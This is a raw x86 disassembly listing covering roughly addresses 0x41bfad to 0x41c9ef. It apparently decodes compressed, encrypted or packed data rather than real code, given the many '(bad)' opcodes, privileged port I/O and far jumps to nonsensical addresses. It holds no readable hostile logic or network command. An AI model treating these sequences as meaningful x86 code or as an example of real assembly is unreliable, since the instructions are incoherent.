  41bfad:	(bad)  
  41bfae:	retf   
  41bfaf:	xor    ah,BYTE PTR [eax-0x75791765]
  41bfb5:	inc    edi
  41bfb6:	pop    ebp
  41bfb7:	call   0x11022c83
  41bfbc:	adc    BYTE PTR [esi],ah
  41bfbe:	cmp    ch,cl
  41bfc0:	in     eax,dx
  41bfc1:	retf   0x0
	...
  41c034:	(bad)  
  41c035:	ficom  WORD PTR [eax]
  41c037:	stos   DWORD PTR es:[edi],eax
  41c038:	sbb    bh,ch
  41c03a:	(bad)  
  41c03b:	jmp    FWORD PTR [esi+0x14bb9a81]
  41c041:	(bad)  
  41c042:	push   cs
  41c043:	iret   
  41c044:	xchg   esp,eax
  41c045:	add    DWORD PTR cs:[eax],eax
  41c048:	test   BYTE PTR [eax],0x0
  41c04b:	add    bh,ah
  41c04d:	mov    bl,0x4d
  41c04f:	fnstcw WORD PTR [edi]
  41c051:	mov    BYTE PTR [edx*1+0x114c8854],cl
  41c058:	and    DWORD PTR [esi-0x23],0x2
  41c05c:	pusha  
  41c05d:	sar    esp,0x48
  41c060:	or     eax,DWORD PTR [esi+eax*8]
  41c063:	add    esi,esp
  41c065:	push   ecx
  41c066:	das    
  41c067:	pusha  
  41c068:	jb     0x41c09a
  41c06a:	lods   al,BYTE PTR ds:[esi]
  41c06b:	push   esp
  41c06c:	and    eax,0xc28394af
  41c071:	mov    esp,DWORD PTR [eax-0x26]
  41c074:	outs   dx,DWORD PTR ds:[esi]
  41c075:	iret   
  41c076:	loopne 0x41c0e7
  41c078:	mov    gs,WORD PTR [ebp*2+0x6d2f9c59]
  41c07f:	xor    ecx,DWORD PTR [esi]
  41c081:	adc    ebp,esi
  41c083:	js     0x41c09b
  41c085:	fadd   QWORD PTR [esi-0x43]
  41c088:	mov    WORD PTR [eax],?
  41c08a:	in     al,dx
  41c08b:	push   edx
  41c08c:	dec    edi
  41c08d:	or     bh,dh
  41c08f:	xchg   esi,eax
  41c090:	mov    ah,0x8d
  41c092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c093:	gs (bad) 
  41c096:	and    cl,al
  41c098:	xchg   BYTE PTR [ecx+eiz*1+0x20daa69f],bh
  41c09f:	push   ebp
  41c0a0:	daa    
  41c0a1:	inc    esi
  41c0a2:	or     DWORD PTR [ebp+0x3bdf7f9a],ecx
  41c0a8:	mov    dl,0x6e
  41c0aa:	inc    esp
  41c0ab:	lods   al,BYTE PTR ds:[esi]
  41c0ac:	xchg   esp,eax
  41c0ad:	push   es
  41c0ae:	stos   BYTE PTR es:[edi],al
  41c0af:	ins    BYTE PTR es:[edi],dx
  41c0b0:	nop
  41c0b1:	sub    BYTE PTR [ebp+0x4a1dbcb0],ah
  41c0b7:	retf   
  41c0b8:	sbb    ch,BYTE PTR [esi-0x6c1cde01]
  41c0be:	pop    ebp
  41c0bf:	arpl   WORD PTR [edi-0x2f06b80],di
  41c0c5:	pop    ebx
  41c0c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0c7:	jmp    0x850c:0x82f435e2
  41c0ce:	mov    ecx,es
  41c0d0:	cdq    
  41c0d1:	lahf   
  41c0d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0d3:	test   al,0x91
  41c0d5:	cwde   
  41c0d6:	les    eax,FWORD PTR [ebp+eiz*4+0x55]
  41c0da:	add    BYTE PTR [ebx+0x3e],ch
  41c0dd:	test   al,0xdb
  41c0df:	lods   eax,DWORD PTR ds:[esi]
  41c0e0:	fimul  WORD PTR [eax+eax*1]
  41c0e3:	dec    eax
  41c0e4:	inc    ecx
  41c0e5:	push   ecx
  41c0e6:	ret    
  41c0e7:	mov    ecx,0xdf90319f
  41c0ec:	sub    BYTE PTR [ebx-0x16],al
  41c0ef:	sbb    al,0xe7
  41c0f1:	retf   0x17cc
  41c0f4:	sti    
  41c0f5:	jbe    0x41c15a
  41c0f7:	lock sub al,0x59
  41c0fa:	repnz mov al,ds:0x7b302640
  41c100:	xchg   ecx,eax
  41c101:	inc    ebp
  41c102:	imul   eax,DWORD PTR [ebx-0x7f],0xffffffc4
  41c106:	cld    
  41c107:	inc    ebp
  41c108:	mov    bh,0x3c
  41c10a:	cmp    eax,0xdaa5931d
  41c10f:	pop    eax
  41c110:	shl    DWORD PTR [edx-0x183fb93f],0xce
  41c117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c118:	pop    ds
  41c119:	xchg   BYTE PTR [ebx+eax*8+0x3d],dl
  41c11d:	aam    0x47
  41c11f:	sub    ecx,DWORD PTR [edx]
  41c121:	xchg   ecx,eax
  41c122:	and    al,0xd9
  41c124:	(bad)  
  41c126:	pop    esp
  41c127:	push   ebp
  41c128:	aas    
  41c129:	and    DWORD PTR [eax],edi
  41c12b:	jge    0x41c11f
  41c12d:	enter  0x5715,0x4e
  41c131:	or     BYTE PTR [eax+0x59],0x47
  41c135:	cld    
  41c136:	xor    bl,BYTE PTR [edi]
  41c138:	push   ss
  41c139:	inc    esi
  41c13a:	sbb    bl,dh
  41c13c:	adc    bl,cl
  41c13e:	add    eax,0x1a7d8d
	...
  41c1b3:	add    BYTE PTR [esi+0x6be069a5],cl
  41c1b9:	in     al,dx
  41c1ba:	(bad)  
  41c1bb:	out    dx,eax
  41c1bc:	sbb    BYTE PTR [edi],0x8e
  41c1bf:	sbb    eax,0x13b9f8ee
  41c1c4:	mov    ch,BYTE PTR [edi]
  41c1c6:	add    DWORD PTR [eax],eax
  41c1c8:	test   BYTE PTR [eax],0x0
  41c1cb:	add    BYTE PTR [ecx+0x48],ch
  41c1ce:	pusha  
  41c1cf:	js     0x41c179
  41c1d1:	or     eax,0x7a077250
  41c1d6:	mov    eax,0xb3914279
  41c1db:	scas   al,BYTE PTR es:[edi]
  41c1dc:	mov    ah,0x52
  41c1de:	sbb    DWORD PTR [ebx+eiz*2-0xadfe075],edx
  41c1e5:	imul   DWORD PTR [edi+0x2992643]
  41c1eb:	es into 
  41c1ed:	or     BYTE PTR ds:0x20f0cfff,0xfc
  41c1f4:	and    eax,0x8b6ee075
  41c1f9:	sub    al,0xd9
  41c1fb:	push   ss
  41c1fc:	sub    al,0xc7
  41c1fe:	sbb    DWORD PTR [ecx],ecx
  41c200:	ja     0x41c202
  41c202:	shr    ah,1
  41c204:	jb     0x41c227
  41c206:	(bad)
  41c209:	daa    
  41c20a:	icebp  
  41c20b:	mov    esi,0xb12d1cfc
  41c210:	cmc    
  41c211:	std    
  41c212:	jl     0x41c1e5
  41c214:	xor    eax,DWORD PTR [esi]
  41c216:	(bad)  
  41c217:	jb     0x41c1a9
  41c219:	sbb    BYTE PTR [ebp-0x14857c11],bh
  41c21f:	scas   eax,DWORD PTR es:[edi]
  41c220:	(bad)  
  41c221:	and    eax,0x1e7dd665
  41c226:	push   edx
  41c227:	sbb    BYTE PTR [edx+0x6ed5c61e],dh
  41c22d:	bound  ecx,QWORD PTR [ebp-0x2478b303]
  41c233:	jmp    0x41c27d
  41c235:	out    dx,eax
  41c236:	inc    ebp
  41c237:	bound  edx,QWORD PTR [ebx]
  41c239:	scas   eax,DWORD PTR es:[edi]
  41c23a:	mov    dh,0x11
  41c23c:	into   
  41c23d:	ja     0x41c218
  41c23f:	imul   ebx,DWORD PTR [ebp-0x19],0x3d
  41c243:	(bad)  
  41c244:	call   0xba3b0654
  41c249:	mov    ds,WORD PTR [edx]
  41c24b:	cdq    
  41c24c:	cdq    
  41c24d:	cmp    dh,BYTE PTR [ebx]
  41c24f:	imul   ebp,DWORD PTR [ebx+edi*4-0x4d],0xae4bceb0
  41c257:	sbb    eax,0xe8dcdcef
  41c25c:	inc    eax
  41c25d:	push   ebx
  41c25e:	mov    eax,0x600a5afe
  41c263:	adc    al,0x2f
  41c265:	cmp    dl,BYTE PTR [ecx-0x28c3729c]
  41c26b:	xor    al,BYTE PTR [ebx]
  41c26d:	popa   
  41c26e:	and    ecx,0x2d2407d8
  41c274:	sub    dl,dh
  41c276:	inc    esp
  41c277:	fild   WORD PTR [ebx+eiz*1+0x44eee067]
  41c27e:	lods   al,BYTE PTR ds:[esi]
  41c27f:	sub    ebp,edi
  41c281:	or     BYTE PTR fs:[esi-0x4d],ch
  41c285:	cmp    DWORD PTR [ebx-0x2137c631],0x92e97f58
  41c28f:	pusha  
  41c290:	mov    eax,DWORD PTR [ebx+0x66]
  41c293:	test   al,0xee
  41c295:	mov    ds,WORD PTR [eax+0x6d]
  41c298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c299:	dec    edi
  41c29a:	jle    0x41c253
  41c29c:	xor    DWORD PTR [edi],0x75
  41c29f:	fs (bad) 
  41c2a1:	xchg   ebp,eax
  41c2a2:	cmp    eax,esi
  41c2a4:	dec    edx
  41c2a5:	mov    ds:0x924b24c0,al
  41c2aa:	in     eax,0x8e
  41c2ac:	cmp    al,0x35
  41c2ae:	xchg   ebx,eax
  41c2af:	and    DWORD PTR [ebx+esi*8+0xb],0xfffffff7
  41c2b4:	mov    bl,0xa3
  41c2b6:	xor    ecx,DWORD PTR [esi+ecx*8+0x3cff884]
  41c2bd:	aaa    
  41c2be:	dec    ecx
  41c2bf:	xor    al,0x47
  41c2c1:	jns    0x41c2c3
	...
  41c333:	add    BYTE PTR [eax+0xd],cl
  41c336:	sbb    eax,0xfebb5dab
  41c33b:	out    dx,eax
  41c33c:	aad    0x1f
  41c33e:	jo     0x41c35e
  41c340:	in     eax,dx
  41c341:	ss test eax,0x130802c
  41c347:	add    dh,dh
  41c349:	add    BYTE PTR [eax],al
  41c34b:	add    BYTE PTR [ebp+eax*8-0x3748791c],dl
  41c352:	sub    DWORD PTR [ecx+esi*8],0x4644d3a1
  41c359:	popa   
  41c35a:	sbb    al,0x58
  41c35c:	sbb    eax,0x1ebd32e5
  41c361:	and    ecx,DWORD PTR [edi+0x7]
  41c364:	add    bh,BYTE PTR [ecx]
  41c366:	inc    edx
  41c367:	leave  
  41c368:	sbb    al,0xf9
  41c36a:	lahf   
  41c36b:	jnp    0x41c3e4
  41c36d:	iret   
  41c36e:	push   eax
  41c36f:	mov    BYTE PTR [edi+0x24],bl
  41c372:	data16 lods al,BYTE PTR ds:[esi]
  41c374:	pop    ss
  41c375:	xor    bl,bh
  41c377:	mov    ch,0xf8
  41c379:	sar    BYTE PTR [ecx+0x32],cl
  41c37c:	mov    al,ds:0xe689b46c
  41c381:	(bad)  
  41c382:	xchg   DWORD PTR [ebp-0x5fb1c1c3],edx
  41c388:	fsubr  DWORD PTR [ebp+0x3a]
  41c38b:	icebp  
  41c38c:	dec    eax
  41c38d:	in     eax,0x1
  41c38f:	dec    esp
  41c390:	xor    ah,BYTE PTR [ecx+edi*4+0x43aae25f]
  41c397:	gs adc dl,ah
  41c39a:	pushf  
  41c39b:	out    dx,eax
  41c39c:	push   eax
  41c39d:	stos   BYTE PTR es:[edi],al
  41c39e:	lds    esi,FWORD PTR [ecx-0x3a]
  41c3a1:	add    al,0x9f
  41c3a3:	sub    al,0x3b
  41c3a5:	stos   DWORD PTR es:[edi],eax
  41c3a6:	in     al,0xcd
  41c3a8:	ret    0x111f
  41c3ab:	ror    DWORD PTR [esi],1
  41c3ad:	aas    
  41c3ae:	mov    ch,0xf5
  41c3b0:	lahf   
  41c3b1:	mov    edx,0xb0fe5e81
  41c3b6:	lods   al,BYTE PTR ds:[esi]
  41c3b7:	inc    ecx
  41c3b8:	xor    ch,BYTE PTR [edi-0x15]
  41c3bb:	xchg   DWORD PTR [ecx],ebp
  41c3bd:	dec    esp
  41c3be:	sbb    eax,0x4aa54b36
  41c3c3:	pop    ss
  41c3c4:	jo     0x41c3ba
  41c3c6:	cmp    eax,0x90719eb1
  41c3cb:	pop    es
  41c3cc:	fs ss stc 
  41c3cf:	xor    ebx,DWORD PTR [eax]
  41c3d1:	xchg   esi,eax
  41c3d2:	push   es
  41c3d3:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3d5:	add    dh,bl
  41c3d7:	(bad)  
  41c3d8:	out    dx,eax
  41c3d9:	loope  0x41c396
  41c3db:	push   es
  41c3dc:	push   ss
  41c3dd:	pop    ebp
  41c3de:	outs   dx,DWORD PTR ds:[esi]
  41c3df:	push   0x3a
  41c3e1:	dec    eax
  41c3e2:	imul   edi,DWORD PTR [ebx+0x75c3069],0xf59a5c8a
  41c3ec:	jecxz  0x41c460
  41c3ee:	mov    ah,0x7a
  41c3f0:	sti    
  41c3f1:	pop    esp
  41c3f2:	inc    ecx
  41c3f3:	stos   DWORD PTR es:[edi],eax
  41c3f4:	popa   
  41c3f5:	and    eax,0x87907df1
  41c3fa:	aaa    
  41c3fb:	ret    
  41c3fc:	mov    ah,0x73
  41c3fe:	retf   0x2095
  41c401:	stc    
  41c402:	jg     0x41c409
  41c404:	jmp    0x90cfcae
  41c409:	idiv   BYTE PTR [ecx+0x419d7fcd]
  41c40f:	ret    0x6e7
  41c412:	pop    esi
  41c413:	dec    edx
  41c414:	dec    ebp
  41c415:	fld    QWORD PTR [edi]
  41c417:	sar    BYTE PTR [esi+0x4f0bdaf4],0xff
  41c41e:	sbb    dh,BYTE PTR [ebx-0x3b42b18f]
  41c424:	pop    esi
  41c425:	pop    edx
  41c426:	cmp    DWORD PTR ds:0x3c9766b,ebp
  41c42c:	or     ebp,DWORD PTR [ebp+ebx*2+0x2]
  41c430:	push   cs
  41c431:	(bad)  
  41c432:	mov    ecx,0x27a1d63
  41c437:	mov    ebp,0xdd5278eb
  41c43c:	sub    DWORD PTR [ecx+0x1e95336a],ebp
	...
  41c4b2:	add    BYTE PTR [eax],al
  41c4b4:	aam    0xec
  41c4b6:	add    edi,edi
  41c4b8:	cmp    edi,edi
  41c4ba:	(bad)  
  41c4bb:	out    dx,eax
  41c4bc:	dec    edi
  41c4bd:	retf   
  41c4be:	fstp   TBYTE PTR [ebx+0x15b23d0c]
  41c4c4:	jbe    0x41c4f7
  41c4c6:	add    DWORD PTR [eax],eax
  41c4c8:	test   BYTE PTR [eax],0x0
  41c4cb:	add    BYTE PTR [ebp+0x44ef06e1],ch
  41c4d1:	sbb    eax,0xf0ba775
  41c4d6:	inc    edx
  41c4d7:	daa    
  41c4d8:	das    
  41c4d9:	mov    eax,0xbbcfa509
  41c4de:	clc    
  41c4df:	mov    edx,0xac2404f6
  41c4e4:	push   edx
  41c4e5:	xchg   DWORD PTR [ebx+0x0],edx
  41c4e8:	push   es
  41c4e9:	call   0x49e95ddf
  41c4ee:	stos   BYTE PTR es:[edi],al
  41c4ef:	or     edx,eax
  41c4f1:	push   0x453b6da9
  41c4f6:	in     al,0x47
  41c4f8:	jb     0x41c556
  41c4fa:	push   edx
  41c4fb:	inc    eax
  41c4fc:	xor    ebx,esp
  41c4fe:	add    al,BYTE PTR [edi+0x66]
  41c501:	push   ds
  41c502:	(bad)  
  41c503:	loop   0x41c565
  41c505:	or     DWORD PTR [ecx-0x73fece11],esi
  41c50b:	inc    eax
  41c50c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c50d:	(bad)  
  41c50e:	cmp    edx,DWORD PTR [edx]
  41c510:	ins    DWORD PTR es:[edi],dx
  41c511:	dec    ebx
  41c512:	push   edx
  41c513:	xchg   ebx,eax
  41c514:	cwde   
  41c515:	sbb    ecx,eax
  41c517:	ins    DWORD PTR es:[edi],dx
  41c518:	cld    
  41c519:	and    dh,dh
  41c51b:	popf   
  41c51c:	dec    esi
  41c51d:	xchg   esp,eax
  41c51e:	jmp    0x78767ba3
  41c523:	and    BYTE PTR [esp+edx*4],dh
  41c526:	inc    eax
  41c527:	test   BYTE PTR [ebx-0x39b545a3],bl
  41c52d:	jo     0x41c57b
  41c52f:	inc    esp
  41c530:	stc    
  41c531:	les    edi,FWORD PTR [edx]
  41c533:	aaa    
  41c534:	pavgw  mm7,QWORD PTR cs:[eax-0x4c]
  41c539:	outs   dx,DWORD PTR ds:[esi]
  41c53a:	mov    cl,0x5a
  41c53c:	pop    edi
  41c53d:	enter  0xf1ac,0xeb
  41c541:	sar    BYTE PTR ds:0xab68988b,1
  41c547:	sub    dh,BYTE PTR [eax+0x7e756aff]
  41c54d:	mov    ebp,0xdba8f813
  41c552:	jnp    0x41c503
  41c554:	cmp    DWORD PTR [eax-0x78],edx
  41c557:	xor    al,BYTE PTR [ebx-0x5a]
  41c55a:	adc    BYTE PTR [edi-0x42fccd57],ch
  41c560:	push   0xd8a4e18b
  41c565:	std    
  41c566:	ret    0x5974
  41c569:	pop    edi
  41c56a:	fwait
  41c56b:	pop    cx
  41c56d:	mov    WORD PTR [eax],ds
  41c56f:	or     dh,BYTE PTR [ecx+0x314597a6]
  41c575:	lods   al,BYTE PTR ds:[esi]
  41c576:	add    BYTE PTR [ebx+eax*2-0x2e],0x1a
  41c57b:	adc    al,0x5
  41c57d:	popf   
  41c57e:	xchg   ebx,eax
  41c57f:	hlt    
  41c580:	fild   QWORD PTR [ebp-0x3a]
  41c583:	sbb    BYTE PTR [ecx-0x63c20adf],al
  41c589:	outs   dx,DWORD PTR ds:[esi]
  41c58a:	jno    0x41c5d0
  41c58c:	pop    eax
  41c58d:	inc    esp
  41c58e:	dec    esp
  41c58f:	inc    esi
  41c590:	push   ds
  41c591:	or     cl,ch
  41c593:	cmp    BYTE PTR [ecx+0x69],cl
  41c596:	mov    eax,ds:0x90d2da67
  41c59b:	out    0xb1,al
  41c59d:	mov    ds:0x5260a0d3,eax
  41c5a2:	mov    ebx,0xefadf1e7
  41c5a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5a8:	loop   0x41c616
  41c5aa:	sbb    eax,0x6871c591
  41c5af:	mov    ds:0x846cbe93,eax
  41c5b4:	jae    0x41c566
  41c5b6:	sbb    al,0xd
  41c5b8:	repnz xor eax,0x7ced5b58
  41c5be:	push   0x43
  41c5c0:	and    BYTE PTR [ebx+0x0],al
	...
  41c633:	add    BYTE PTR [eax-0x2469e49d],ch
  41c639:	(bad)  
  41c63a:	lods   eax,DWORD PTR ds:[esi]
  41c63b:	jg     0x41c62c
  41c63d:	add    al,0x38
  41c63f:	lods   al,BYTE PTR ds:[esi]
  41c640:	aas    
  41c641:	pop    ebp
  41c642:	fist   WORD PTR [ebx]
  41c644:	ins    BYTE PTR es:[edi],dx
  41c645:	xor    al,BYTE PTR [ecx]
  41c647:	add    dh,dh
  41c649:	add    BYTE PTR [eax],al
  41c64b:	add    BYTE PTR [esi+0x7f],dl
  41c64e:	sub    eax,0x4ba6adfa
  41c653:	mov    ds:0xc210e8ff,al
  41c658:	test   al,0x7b
  41c65a:	inc    esi
  41c65b:	add    eax,0xc3293fe0
  41c660:	push   ds
  41c661:	push   edi
  41c662:	or     dh,dh
  41c664:	push   ss
  41c665:	repz loope 0x41c6ae
  41c668:	inc    ebx
  41c669:	sbb    dh,BYTE PTR [edi-0x37eadf8b]
  41c66f:	aad    0x19
  41c671:	push   es
  41c672:	loop   0x41c6de
  41c674:	into   
  41c675:	daa    
  41c676:	xchg   ebx,eax
  41c677:	out    0x7f,al
  41c679:	dec    esi
  41c67a:	lea    ecx,[esi]
  41c67c:	push   cs
  41c67d:	out    dx,al
  41c67e:	addr16 jb 0x41c6bd
  41c681:	dec    esi
  41c682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c683:	xor    esi,ecx
  41c685:	sbb    BYTE PTR [eax+0x6b9a96aa],ah
  41c68b:	pop    ebp
  41c68c:	lds    ecx,FWORD PTR [ecx]
  41c68e:	mov    eax,DWORD PTR [edi+0x12558ec7]
  41c694:	nop
  41c695:	inc    eax
  41c696:	fist   DWORD PTR [ebx-0x28a30aed]
  41c69c:	std    
  41c69d:	fistp  DWORD PTR [ecx+0x44]
  41c6a0:	das    
  41c6a1:	gs jmp 0x41c629
  41c6a4:	ja     0x41c70c
  41c6a6:	mov    eax,0x2d2e59c3
  41c6ab:	je     0x41c67c
  41c6ad:	pop    ebx
  41c6ae:	repz cmp ch,dh
  41c6b1:	pop    esp
  41c6b2:	push   edx
  41c6b3:	add    dh,BYTE PTR [edx+0x20]
  41c6b6:	sbb    BYTE PTR [ebx],0x6d
  41c6b9:	inc    eax
  41c6ba:	cld    
  41c6bb:	dec    esp
  41c6bc:	lock mov ch,0x34
  41c6bf:	retf   0x2df7
  41c6c2:	clc    
  41c6c3:	mov    dl,0xe3
  41c6c5:	cmp    DWORD PTR [edi+ebx*8-0x13],eax
  41c6c9:	into   
  41c6ca:	lods   al,BYTE PTR ds:[esi]
  41c6cb:	pushf  
  41c6cc:	jle    0x41c683
  41c6ce:	ins    DWORD PTR es:[edi],dx
  41c6cf:	pcmpgtb mm6,QWORD PTR [edx]
  41c6d2:	ss mov edx,0x9cdad9e8
  41c6d8:	pop    eax
  41c6d9:	ss ret 
  41c6db:	xchg   edi,eax
  41c6dc:	scas   al,BYTE PTR es:[edi]
  41c6dd:	aas    
  41c6de:	push   ebx
  41c6df:	imul   DWORD PTR [edi]
  41c6e1:	in     al,dx
  41c6e2:	push   es
  41c6e3:	ds aaa 
  41c6e5:	das    
  41c6e6:	ror    BYTE PTR ds:[esi+0x647ed503],cl
  41c6ed:	cs repnz pop esp
  41c6f0:	mov    ecx,0xcc7fdd4c
  41c6f5:	pop    ecx
  41c6f6:	jne    0x41c6ab
  41c6f8:	sub    eax,0x19d846f3
  41c6fd:	push   ebx
  41c6fe:	cmp    bh,BYTE PTR [ebp+0x1e]
  41c701:	jb     0x41c6ed
  41c703:	mov    ecx,0x3438dbb4
  41c708:	pop    ebx
  41c709:	shr    BYTE PTR [esi-0x3d2b00b8],1
  41c70f:	inc    ecx
  41c710:	fsubr  QWORD PTR [edi]
  41c712:	mov    ds:0xe2444edb,al
  41c717:	sub    eax,DWORD PTR [ecx]
  41c719:	stos   BYTE PTR es:[edi],al
  41c71a:	nop
  41c71b:	push   ebx
  41c71c:	push   ds
  41c71d:	pop    esi
  41c71e:	gs add al,0x78
  41c721:	pop    es
  41c722:	inc    ebx
  41c723:	sbb    cl,dl
  41c725:	in     eax,dx
  41c726:	and    dl,al
  41c728:	adc    eax,0x342f5e7d
  41c72d:	lea    ecx,[ebp-0x43]
  41c730:	rol    DWORD PTR [ecx+eax*2],1
  41c733:	dec    ebp
  41c734:	ret    0xd302
  41c737:	shl    DWORD PTR [edx],cl
  41c739:	stos   BYTE PTR es:[edi],al
  41c73a:	push   ss
  41c73b:	add    al,0x16
  41c73d:	into   
  41c73e:	or     bl,ah
  41c740:	inc    edi
  41c741:	mov    WORD PTR [eax],es
	...
  41c7b3:	add    BYTE PTR [edx-0x8b13804],cl
  41c7b9:	jg     0x41c746
  41c7bb:	cld    
  41c7bc:	add    edi,esp
  41c7be:	adc    eax,0x880efb54
  41c7c3:	call   0xf6:0x13362
  41c7ca:	add    BYTE PTR [eax],al
  41c7cc:	aam    0xe1
  41c7ce:	call   0x34af:0x3431094e
  41c7d5:	xchg   edi,eax
  41c7d6:	jne    0x41c7ec
  41c7d8:	mov    ebx,gs
  41c7da:	sub    edx,esi
  41c7dc:	push   esp
  41c7dd:	fistp  DWORD PTR [ecx-0x17a278e9]
  41c7e3:	fucomi st,st(0)
  41c7e5:	xor    eax,0xe72d9bc2
  41c7ea:	xor    BYTE PTR [ebx+0x44],0xb4
  41c7ee:	out    0x10,al
  41c7f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7f1:	ret    0xc522
  41c7f4:	sub    dl,ah
  41c7f6:	xor    ch,bl
  41c7f8:	push   edx
  41c7f9:	dec    edi
  41c7fa:	loope  0x41c861
  41c7fc:	xchg   ebp,eax
  41c7fd:	mov    ds:0x741c23e4,al
  41c802:	pop    esp
  41c803:	cmp    DWORD PTR ds:0x45991c1f,edi
  41c809:	xchg   edi,eax
  41c80a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c80b:	xchg   DWORD PTR [ebx-0xa66315d],ebx
  41c811:	adc    esp,edx
  41c813:	lods   al,BYTE PTR ds:[esi]
  41c814:	das    
  41c815:	adc    DWORD PTR [ecx+eax*1-0x80],ecx
  41c819:	jbe    0x41c838
  41c81b:	lahf   
  41c81c:	stc    
  41c81d:	(bad)  [edx+0x45792c95]
  41c823:	and    dl,ah
  41c825:	ss es lock out 0x2b,eax
  41c82a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c82b:	xchg   esi,eax
  41c82c:	mov    bh,0x6f
  41c82e:	jo     0x41c81f
  41c830:	jno    0x41c841
  41c832:	pop    eax
  41c833:	mov    al,ds:0x71b7eac2
  41c838:	shr    DWORD PTR [ebx],1
  41c83a:	sbb    cl,BYTE PTR [edx*1-0x1200ccba]
  41c841:	mov    ds,WORD PTR [edi+0x2fab5748]
  41c847:	mov    ds:0xfd8bc878,eax
  41c84d:	and    eax,0xbbca6451
  41c852:	icebp  
  41c853:	(bad)  
  41c854:	loope  0x41c866
  41c856:	frstor [ebx+0x0]
  41c859:	sbb    bl,dh
  41c85b:	add    eax,0x788f9cbe
  41c860:	sbb    esi,ebx
  41c862:	dec    esi
  41c863:	(bad)  
  41c864:	jmp    0x41c7fc
  41c866:	xor    al,0x5c
  41c868:	pop    esp
  41c869:	stos   BYTE PTR es:[edi],al
  41c86a:	xchg   edx,eax
  41c86b:	and    BYTE PTR [eax],ah
  41c86d:	jne    0x41c874
  41c86f:	je     0x41c8bd
  41c871:	xor    DWORD PTR [edx-0x7c2720],ebx
  41c877:	shl    dh,1
  41c879:	ja     0x41c87f
  41c87b:	mov    dh,0x62
  41c87d:	xchg   edi,eax
  41c87e:	popf   
  41c87f:	aad    0x13
  41c881:	xor    BYTE PTR [eax+ebp*4],0x11
  41c885:	aas    
  41c886:	inc    ebp
  41c887:	mov    eax,0xfb3bdcb5
  41c88c:	dec    edx
  41c88d:	xor    eax,0x6614390c
  41c892:	mov    bl,0x52
  41c894:	jo     0x41c855
  41c896:	nop
  41c897:	out    0x79,al
  41c899:	mov    cs,WORD PTR [edx-0x75]
  41c89c:	mov    ebx,0x673217
  41c8a1:	cs mov ch,0xad
  41c8a4:	xchg   esp,eax
  41c8a5:	adc    eax,0xc142a4e9
  41c8aa:	mov    ecx,0x4c6c63fa
  41c8af:	inc    eax
  41c8b0:	popf   
  41c8b1:	into   
  41c8b2:	adc    al,0xf1
  41c8b4:	xchg   ecx,eax
  41c8b5:	and    ah,BYTE PTR [edx+eiz*8-0x256ac766]
  41c8bc:	dec    ebx
  41c8bd:	loop   0x41c8b7
  41c8bf:	in     al,0xe9
  41c8c1:	push   0x0
	...
  41c932:	add    BYTE PTR [eax],al
  41c934:	ret    
  41c935:	mov    esp,0xf87f4844
  41c93a:	iret   
  41c93b:	mov    edi,0x4f0c9749
  41c940:	hlt    
  41c941:	(bad)  
  41c942:	(bad)  
  41c943:	scas   eax,DWORD PTR es:[edi]
  41c944:	pop    eax
  41c945:	xor    al,0x1
  41c947:	add    dh,dh
  41c949:	add    BYTE PTR [eax],al
  41c94b:	add    BYTE PTR ds:0x1ce7df69,bl
  41c951:	adc    BYTE PTR [edx-0xd42fb43],ah
  41c957:	sbb    BYTE PTR [edx+0x72],0xb3
  41c95b:	test   al,0x0
  41c95d:	test   ebp,ecx
  41c95f:	push   cs
  41c960:	adc    ecx,esp
  41c962:	xchg   esi,eax
  41c963:	(bad)  
  41c964:	int    0xec
  41c966:	out    0x8d,eax
  41c968:	jl     0x41c907
  41c96a:	pop    esp
  41c96b:	ret    
  41c96c:	fldenv [esi+0x2fa0d687]
  41c972:	xchg   DWORD PTR [ebx-0x3b],edx
  41c975:	push   ss
  41c976:	je     0x41c999
  41c978:	jnp    0x41c944
  41c97a:	daa    
  41c97b:	push   edi
  41c97c:	aaa    
  41c97d:	inc    esi
  41c97e:	js     0x41c981
  41c980:	sbb    al,BYTE PTR [eax+0x14]
  41c983:	adc    al,dl
  41c985:	(bad)  
  41c986:	jo     0x41c96c
  41c988:	dec    esi
  41c989:	sub    ah,0xa2
  41c98c:	cwde   
  41c98d:	push   ss
  41c98e:	mov    edi,0xe72293eb
  41c993:	inc    eax
  41c994:	cmp    BYTE PTR [ebx-0x4a],dh
  41c997:	pushf  
  41c998:	xor    BYTE PTR [ecx+0x69ae012d],bh
  41c99e:	fwait
  41c99f:	cli    
  41c9a0:	icebp  
  41c9a1:	lods   al,BYTE PTR ds:[esi]
  41c9a2:	and    al,BYTE PTR [ebp-0xcd306f8]
  41c9a8:	clc    
  41c9a9:	dec    edx
  41c9aa:	cmp    ebx,DWORD PTR [edi+ecx*2+0x396f7a4d]
  41c9b1:	out    0x37,eax
  41c9b3:	fsubr  DWORD PTR [esi+0x4b80d1d8]
  41c9b9:	mov    ebx,0x6abc2a9f
  41c9be:	mov    esp,DWORD PTR [ecx-0x6c22fa1e]
  41c9c4:	mov    ebx,0x8c634b71
  41c9c9:	(bad)  
  41c9ca:	cmp    BYTE PTR [ebx+eax*1+0x12968f6d],dh
  41c9d1:	lods   eax,DWORD PTR ds:[esi]
  41c9d2:	ins    DWORD PTR es:[edi],dx
  41c9d3:	jge    0x41c97e
  41c9d5:	push   edi
  41c9d6:	mov    ah,BYTE PTR [esi]
  41c9d8:	hlt    
  41c9d9:	sbb    cl,BYTE PTR [esi+0x3d]
  41c9dc:	cmc    
  41c9dd:	(bad)  
  41c9de:	xchg   edi,eax
  41c9df:	scas   eax,DWORD PTR es:[edi]
  41c9e0:	jmp    FWORD PTR [ecx]
  41c9e2:	mov    ebx,0xb0fe2fc0
  41c9e7:	mov    al,0xc5
  41c9e9:	inc    eax
  41c9ea:	ret    
  41c9eb:	or     al,0x1a
  41c9ed:	xchg   ebx,eax
  41c9ee:	inc    ebp
  41c9ef:	jmp    0xdd1c:0x212de500
